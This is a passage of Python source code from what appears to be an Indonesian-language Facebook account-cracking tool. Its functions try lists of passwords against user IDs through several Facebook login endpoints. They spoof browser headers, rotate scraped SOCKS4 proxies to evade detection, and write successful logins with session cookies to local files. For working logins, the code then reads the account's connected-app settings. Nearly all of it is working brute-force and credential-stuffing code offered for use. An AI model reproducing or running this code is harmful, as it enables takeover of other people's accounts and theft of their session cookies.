			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D1621350254745606%26redirect_uri%3Dhttps%253A%252F%252Fpassport.airbrush.io%252Foauth2%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Dopenid%2Bpublic_profile%2Bemail%26state%3DeyJhcHBfaWQiOiJ6a25qaXBxb3l5ZmkwM2hrcW5peXciLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FpcmJydXNoLmNvbS9lbi9hY2NvdW50L2xvZ2luP3RoaXJkLWxvZ2luPTEiLCJpbnZpdGF0aW9uX2NvZGUiOiIiLCJ0eXBlIjowLCJvcGVuX2lkIjoiIiwic3ViX2lkIjoiIiwicHJvdmlkZXJfaWQiOiIiLCJzdGF0ZSI6IiIsInN5c3RlbSI6ImFuZHJvaWQifQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5444b78f-b337-4e54-8438-af0b8ba130aa%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.airbrush.io%2Foauth2%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhcHBfaWQiOiJ6a25qaXBxb3l5ZmkwM2hrcW5peXciLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FpcmJydXNoLmNvbS9lbi9hY2NvdW50L2xvZ2luP3RoaXJkLWxvZ2luPTEiLCJpbnZpdGF0aW9uX2NvZGUiOiIiLCJ0eXBlIjowLCJvcGVuX2lkIjoiIiwic3ViX2lkIjoiIiwicHJvdmlkZXJfaWQiOiIiLCJzdGF0ZSI6IiIsInN5c3RlbSI6ImFuZHJvaWQifQ%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v14.0/dialog/oauth?auth_type=rerequest&client_id=1621350254745606&redirect_uri=https%3A%2F%2Fpassport.airbrush.io%2Foauth2%2Fcallback%2Ffacebook&response_type=code&scope=openid+public_profile+email&state=eyJhcHBfaWQiOiJ6a25qaXBxb3l5ZmkwM2hrcW5peXciLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FpcmJydXNoLmNvbS9lbi9hY2NvdW50L2xvZ2luP3RoaXJkLWxvZ2luPTEiLCJpbnZpdGF0aW9uX2NvZGUiOiIiLCJ0eXBlIjowLCJvcGVuX2lkIjoiIiwic3ViX2lkIjoiIiwicHJvdmlkZXJfaWQiOiIiLCJzdGF0ZSI6IiIsInN5c3RlbSI6ImFuZHJvaWQifQ&ret=login&fbapp_pres=0&logger_id=5444b78f-b337-4e54-8438-af0b8ba130aa&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='m_pixel_ratio=2; wd=360x564'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="107"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D1621350254745606%26redirect_uri%3Dhttps%253A%252F%252Fpassport.airbrush.io%252Foauth2%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Dopenid%2Bpublic_profile%2Bemail%26state%3DeyJhcHBfaWQiOiJ6a25qaXBxb3l5ZmkwM2hrcW5peXciLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FpcmJydXNoLmNvbS9lbi9hY2NvdW50L2xvZ2luP3RoaXJkLWxvZ2luPTEiLCJpbnZpdGF0aW9uX2NvZGUiOiIiLCJ0eXBlIjowLCJvcGVuX2lkIjoiIiwic3ViX2lkIjoiIiwicHJvdmlkZXJfaWQiOiIiLCJzdGF0ZSI6IiIsInN5c3RlbSI6ImFuZHJvaWQifQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5444b78f-b337-4e54-8438-af0b8ba130aa%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.airbrush.io%2Foauth2%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhcHBfaWQiOiJ6a25qaXBxb3l5ZmkwM2hrcW5peXciLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FpcmJydXNoLmNvbS9lbi9hY2NvdW50L2xvZ2luP3RoaXJkLWxvZ2luPTEiLCJpbnZpdGF0aW9uX2NvZGUiOiIiLCJ0eXBlIjowLCJvcGVuX2lkIjoiIiwic3ViX2lkIjoiIiwicHJvdmlkZXJfaWQiOiIiLCJzdGF0ZSI6IiIsInN5c3RlbSI6ImFuZHJvaWQifQ%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[bold yellow]{cpc}")
				tree.add(f"[bold yellow]Tahun akun {tahun(idf)}")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]Tahun akun {tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{n}[{Hm}{nok}{n}] {B}{muncul[0]} {muncul[1]}{n}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{n}[{KM}{hit}{n}] {M}{muncul[0]} {muncul[1]}{n}\n")
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]Tahun akun {tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}").add(f"[bold green]{infoakun}\n") 
					cetak(tree) 
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#=============[ VALIDATE ]===============#
def crack_free_date(idf,pwv):
	global loop,ok,cp
	bo = random.choice([HM,KM,BM])
	prog.update(des,description=f"[%] validate_free die:-{loop} ok:-[bold green]{ok}[/] cp:-[bold yellow]{cp}[/] total:-{len(id)}")
	prog.advance(des) 
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	for pw in pwv:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs= {'http': 'socks4://'+nip}
			ua = Saran(glento=1)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ses.headers.update({
				'Host': 'free.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua-mobile': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=322819995959411&kid_directed_site=0&app_id=322819995959411&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D322819995959411%26redirect_uri%3Dhttps%253A%252F%252Finfoday.sydney.edu.au%252Fstudents%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQtlRdctEkORX%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D78c8f4d8-882a-42da-91b8-041d5c952e01%26tp%3Dunspecified&cancel_url=https%3A%2F%2Finfoday.sydney.edu.au%2Fstudents%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQtlRdctEkORX%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":"https://free.facebook.com/v13.0/dialog/oauth?client_id=322819995959411&redirect_uri=https%3A%2F%2Finfoday.sydney.edu.au%2Fstudents%2Ffacebook%2Flogin%2Fcallback%2F&scope=email%2Cpublic_profile&response_type=code&state=QtlRdctEkORX&auth_type=rerequest&ret=login&fbapp_pres=0&logger_id=78c8f4d8-882a-42da-91b8-041d5c952e01&tp=unspecified",
				"flow":"login_no_pin",
				"pass":pw,
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
				'Host': 'free.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://free.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'x-requested-with': 'XMLHttpRequest',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D322819995959411%26redirect_uri%3Dhttps%253A%252F%252Finfoday.sydney.edu.au%252Fstudents%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQtlRdctEkORX%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D78c8f4d8-882a-42da-91b8-041d5c952e01%26tp%3Dunspecified&cancel_url=https%3A%2F%2Finfoday.sydney.edu.au%2Fstudents%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQtlRdctEkORX%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
					}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[bold yellow]{cpc}")
				tree.add(f"[bold yellow]Tahun akun {tahun(idf)}")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]Tahun akun {tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{n}[{Hm}{nok}{n}] {B}{muncul[0]} {muncul[1]}{n}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{n}[{KM}{hit}{n}] {M}{muncul[0]} {muncul[1]}{n}\n")
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]{tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}").add(f"[bold green]{infoakun}") 
					cetak(tree) 
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#===============[ ASYNC ]=================#
def crack_mobile_sync(idf,pwv):
	global loop,ok,cp
	bo = random.choice([HM,KM,BM])
	prog.update(des,description=f"[%] mobile_async die:-{loop} ok:-[bold green]{ok}[/] cp:-[bold yellow]{cp}[/] total:-{len(id)}")
	prog.advance(des) 
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	for pw in pwv:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs= {'http': 'socks4://'+nip}
			ua = Saran(glento=1)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[bold yellow]{cpc}")
				tree.add(f"[bold yellow]Tahun akun {tahun(idf)}")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]Tahun akun {tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{n}[{Hm}{nok}{n}] {B}{muncul[0]} {muncul[1]}{n}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{n}[{KM}{hit}{n}] {M}{muncul[0]} {muncul[1]}{n}\n")
					tree= Tree(f"[bold green]{okc}")
					tree.add(f"[bold green]{tahun(idf)}")
					tree.add(f"[bold green]{idf}|{pw}|{kuki}").add(f"[bold green]{infoakun}\n") 
					cetak(tree) 
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#===============[ ASYNC ]=================#
def crack_mbasic_sync(idf,pwv):
	global loop,ok,cp
	bo = random.choice([HM,KM,BM])
	prog.update(des,description=f"[%] mbasic_async die:-{loop} ok:-[bold green]{ok}[/] cp:-[bold yellow]{cp}[/] total:-{len(id)}")
	prog.advance(des) 
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	for pw in pwv:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs= {'http': 'socks4://'+nip}
			ua = Saran(glento=1)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			link = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'mbasic.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
